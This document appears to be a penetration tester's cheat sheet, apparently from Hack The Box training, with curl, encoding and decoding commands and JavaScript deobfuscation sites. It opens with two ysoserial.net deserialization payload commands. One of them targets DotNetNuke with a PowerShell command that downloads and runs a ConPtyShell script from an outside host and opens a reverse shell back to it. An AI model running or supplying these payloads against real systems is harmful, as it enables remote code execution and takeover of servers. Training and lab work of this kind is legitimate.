
```
wine ~/g1gs/tools/ysoserial.net/ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping 127.0.0.1"  
```
  
```
wine ~/g1gs/tools/ysoserial.net/ysoserial.exe -p DotNetNuke -m run_command -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX(IWR http://192.168.45.167/ConPtyShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.167 54321"
```

|**Command**|**Description**|
|---|---|
|`curl http:/SERVER_IP:PORT/`|cURL GET request|
|`curl -s http:/SERVER_IP:PORT/ -X POST`|cURL POST request|
|`curl -s http:/SERVER_IP:PORT/ -X POST -d "param1=sample"`|cURL POST request with data|
|`echo hackthebox \| base64`|base64 encode|
|`echo ENCODED_B64 \| base64 -d`|base64 decode|
|`echo hackthebox \| xxd -p`|hex encode|
|`echo ENCODED_HEX \| xxd -p -r`|hex decode|
|`echo hackthebox \| tr 'A-Za-z' 'N-ZA-Mn-za-m'`|rot13 encode|
|`echo ENCODED_ROT13 \| tr 'A-Za-z' 'N-ZA-Mn-za-m'`|rot13 decode|

# Deobfuscation Websites

|**Website**|
|---|
|[JS Console](https://jsconsole.com)|
|[Prettier](https://prettier.io/playground/)|
|[Beautifier](https://beautifier.io/)|
|[JSNice](http://www.jsnice.org/)|

# Misc

|**Command**|**Description**|
|---|---|
|`ctrl+u`|Show HTML source code in Firefox|
